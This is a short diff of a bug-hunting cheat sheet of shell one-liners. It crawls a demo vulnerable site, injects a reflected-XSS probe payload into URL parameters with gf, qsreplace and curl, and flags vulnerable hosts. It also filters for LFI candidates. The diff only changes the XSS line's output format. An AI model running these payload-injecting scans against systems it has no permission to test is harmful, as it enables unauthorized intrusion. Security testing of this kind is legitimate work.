@@ -5,7 +5,7 @@ One-liners for finding various vulnerabilities
 katana -u https://testphp.vulnweb.com/ -o katana.txt 
 
 # XSS using GF patterns
-cat katana.txt | gf xss | grep 'source=' | qsreplace '"><script>confirm(1)</script>' | while read host; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo -e "$host \033[0;31mVulnerable\n"; done
+cat katana.txt | gf xss | grep 'source=' | qsreplace '"><script>confirm(1)</script>' | while read host; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo -e "$host {Vulnerable}"; done
 
 # LFI using GF patterns
 cat katana.txt | gf lfi | tee lfi.txt
